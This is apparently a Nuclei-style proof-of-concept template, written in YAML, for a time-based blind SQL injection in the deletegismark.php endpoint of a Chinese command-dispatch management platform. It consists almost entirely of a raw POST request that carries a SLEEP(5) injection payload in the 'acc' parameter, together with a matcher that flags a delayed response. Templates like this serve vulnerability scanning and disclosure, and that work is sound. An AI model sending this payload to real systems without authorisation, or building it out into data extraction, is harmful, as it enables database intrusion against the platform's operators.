id: poc-da6t1yqg6t4x6zb5
info:
  name: 指挥调度管理平台deletegismark.php存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /api/client/deletegismark.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 83


    acc=21''%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP(5)))FIjE)--+-&id=22222'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
